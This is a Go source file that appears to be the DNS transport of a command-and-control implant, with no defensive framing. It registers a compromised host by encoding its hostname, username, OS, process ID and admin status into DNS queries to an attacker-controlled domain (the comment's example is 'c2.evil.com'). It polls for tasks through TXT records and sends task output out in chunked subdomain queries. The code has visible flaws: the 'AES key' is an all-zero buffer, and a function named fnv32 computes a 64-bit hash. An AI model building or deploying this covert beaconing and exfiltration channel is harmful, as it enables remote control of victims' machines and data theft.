//go:build !nodns

package agent

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

// DNS C2 transport.
// DNSServer must be in the form "8.8.8.8:53" or just "8.8.8.8".
// DNSDomain must be the C2 authoritative domain, e.g. "c2.evil.com".
var (
	DNSServer = "" // compile-time: DNS resolver to use
	DNSDomain = "" // compile-time: authoritative C2 domain
)

var b32enc = base32.StdEncoding.WithPadding(base32.NoPadding)

type dnsTransport struct {
	agentID string
	server  string // resolver addr with port
	domain  string // lowercase, no trailing dot
	aesKey  []byte // kept after registration for future use
}

func newDNSTransport() *dnsTransport {
	server := DNSServer
	if server == "" {
		server = "8.8.8.8"
	}
	if !strings.Contains(server, ":") {
		server += ":53"
	}
	domain := strings.ToLower(strings.TrimSuffix(DNSDomain, "."))
	return &dnsTransport{
		server: server,
		domain: domain,
	}
}

// ── transport interface ───────────────────────────────────────────────────

func (d *dnsTransport) register(info sysInfo) error {
	key := make([]byte, 32)
	// generate agent ID from hostname + pid
	d.agentID = agentIDFromInfo(info)

	payload := struct {
		Hostname string `json:"hostname"`
		Username string `json:"username"`
		OS       string `json:"os"`
		PID      int    `json:"pid"`
		AESKey   string `json:"aes_key"`
		IsAdmin  bool   `json:"is_admin,omitempty"`
	}{
		Hostname: info.Hostname,
		Username: info.Username,
		OS:       info.OS,
		PID:      info.PID,
		AESKey:   strings.ToLower(b32enc.EncodeToString(key)),
		IsAdmin:  info.IsAdmin,
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	encoded := strings.ToLower(b32enc.EncodeToString(data))
	chunks := chunkStr(encoded, 48)
	total := len(chunks)
	for seq, chunk := range chunks {
		qname := fmt.Sprintf("reg.%s.%d.%d.%s.%s", chunk, seq, total, d.agentID, d.domain)
		resp, err := d.txQuery(qname)
		if err != nil {
			return err
		}
		if resp != "ok" && !strings.HasPrefix(resp, "ok") {
			return fmt.Errorf("registration rejected: %s", resp)
		}
	}
	return nil
}

func (d *dnsTransport) beacon() ([]taskWire, error) {
	qname := fmt.Sprintf("poll.%s.%s", d.agentID, d.domain)
	resp, err := d.txQuery(qname)
	if err != nil {
		return nil, err
	}
	if resp == "nil" || resp == "" {
		return nil, nil
	}
	var encoded string
	if strings.HasPrefix(resp, "more:") {
		total, _ := strconv.Atoi(strings.TrimPrefix(resp, "more:"))
		var parts []string
		for seq := 0; seq < total; seq++ {
			q := fmt.Sprintf("chunk.%d.%s.%s", seq, d.agentID, d.domain)
			r, err := d.txQuery(q)
			if err != nil {
				return nil, err
			}
			parts = append(parts, strings.TrimPrefix(r, "chunk:"))
		}
		encoded = strings.Join(parts, "")
	} else {
		encoded = resp
	}

	decoded, err := b32enc.DecodeString(strings.ToUpper(encoded))
	if err != nil {
		return nil, fmt.Errorf("b32 decode: %w", err)
	}
	var tw struct {
		ID   int64  `json:"id"`
		Type string `json:"type"`
		Args string `json:"args"`
	}
	if err := json.Unmarshal(decoded, &tw); err != nil {
		return nil, fmt.Errorf("json: %w", err)
	}
	return []taskWire{{ID: tw.ID, Type: tw.Type, Args: tw.Args}}, nil
}

func (d *dnsTransport) sendResultAdmin(taskID int64, output, errStr string, _ bool) error {
	return d.sendResult(taskID, output, errStr)
}

func (d *dnsTransport) sendResult(taskID int64, output, errStr string) error {
	payload := struct {
		TaskID int64  `json:"task_id"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}{TaskID: taskID, Output: output, Error: errStr}
	data, _ := json.Marshal(payload)
	encoded := strings.ToLower(b32enc.EncodeToString(data))
	chunks := chunkStr(encoded, 48)
	total := len(chunks)
	taskIDHex := fmt.Sprintf("%x", taskID)
	for seq, chunk := range chunks {
		qname := fmt.Sprintf("res.%s.%d.%d.%s.%s.%s", chunk, seq, total, taskIDHex, d.agentID, d.domain)
		resp, err := d.txQuery(qname)
		if err != nil {
			return err
		}
		if resp != "ack" {
			return fmt.Errorf("result rejected: %s", resp)
		}
	}
	return nil
}

func (d *dnsTransport) uploadFile(taskID int64, filename string, data []byte) error {
	// DNS transport doesn't support file upload; send base64 in output
	return d.sendResult(taskID, fmt.Sprintf("file:%s:size=%d", filename, len(data)), "upload-not-supported-over-dns")
}

func (d *dnsTransport) downloadFile(filename string) ([]byte, error) {
	return nil, fmt.Errorf("download not supported over DNS transport")
}

// ── DNS query helper ──────────────────────────────────────────────────────

// txQuery sends a TXT DNS query and returns the first TXT value.
func (d *dnsTransport) txQuery(qname string) (string, error) {
	if !strings.HasSuffix(qname, ".") {
		qname += "."
	}
	conn, err := net.DialTimeout("udp", d.server, 5*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// Build DNS TXT query manually (minimal implementation)
	msg := buildDNSQuery(qname, 16) // type 16 = TXT
	if _, err := conn.Write(msg); err != nil {
		return "", err
	}
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	return parseDNSTXTResponse(buf[:n]), nil
}

// buildDNSQuery creates a minimal DNS TXT query packet.
func buildDNSQuery(qname string, qtype uint16) []byte {
	var msg []byte
	// Transaction ID
	msg = append(msg, 0xab, 0xcd)
	// Flags: standard query, recursion desired
	msg = append(msg, 0x01, 0x00)
	// QDCOUNT=1
	msg = append(msg, 0x00, 0x01)
	// ANCOUNT, NSCOUNT, ARCOUNT = 0
	msg = append(msg, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

	// QNAME
	for _, label := range strings.Split(strings.TrimSuffix(qname, "."), ".") {
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00) // root label

	// QTYPE
	msg = append(msg, byte(qtype>>8), byte(qtype))
	// QCLASS = IN
	msg = append(msg, 0x00, 0x01)
	return msg
}

// parseDNSTXTResponse extracts the first TXT string from a DNS response.
func parseDNSTXTResponse(buf []byte) string {
	if len(buf) < 12 {
		return ""
	}
	// Skip header (12 bytes) + question section
	pos := 12
	// Skip question: qname + qtype + qclass
	for pos < len(buf) {
		if buf[pos] == 0 {
			pos++
			break
		}
		if buf[pos]&0xC0 == 0xC0 {
			pos += 2
			break
		}
		pos += int(buf[pos]) + 1
	}
	pos += 4 // skip qtype + qclass

	// Parse answer section
	ancount := int(buf[6])<<8 | int(buf[7])
	for i := 0; i < ancount && pos < len(buf); i++ {
		// Skip name
		for pos < len(buf) {
			if buf[pos] == 0 {
				pos++
				break
			}
			if buf[pos]&0xC0 == 0xC0 {
				pos += 2
				break
			}
			pos += int(buf[pos]) + 1
		}
		if pos+10 > len(buf) {
			break
		}
		rtype := int(buf[pos])<<8 | int(buf[pos+1])
		pos += 8 // type + class + ttl
		rdlen := int(buf[pos])<<8 | int(buf[pos+1])
		pos += 2
		if pos+rdlen > len(buf) {
			break
		}
		rdata := buf[pos : pos+rdlen]
		pos += rdlen
		if rtype == 16 && len(rdata) > 0 { // TXT
			strLen := int(rdata[0])
			if strLen > 0 && len(rdata) > strLen {
				return string(rdata[1 : 1+strLen])
			}
		}
	}
	return ""
}

// ── helpers ───────────────────────────────────────────────────────────────

func chunkStr(s string, size int) []string {
	var chunks []string
	for len(s) > size {
		chunks = append(chunks, s[:size])
		s = s[size:]
	}
	if len(s) > 0 {
		chunks = append(chunks, s)
	}
	return chunks
}

func agentIDFromInfo(info sysInfo) string {
	// Deterministic 16-char ID from hostname+pid
	h := fnv32(info.Hostname + strconv.Itoa(info.PID))
	return fmt.Sprintf("%016x", h)
}

func fnv32(s string) uint64 {
	h := uint64(14695981039346656037)
	for _, c := range []byte(s) {
		h ^= uint64(c)
		h *= 1099511628211
	}
	return h
}
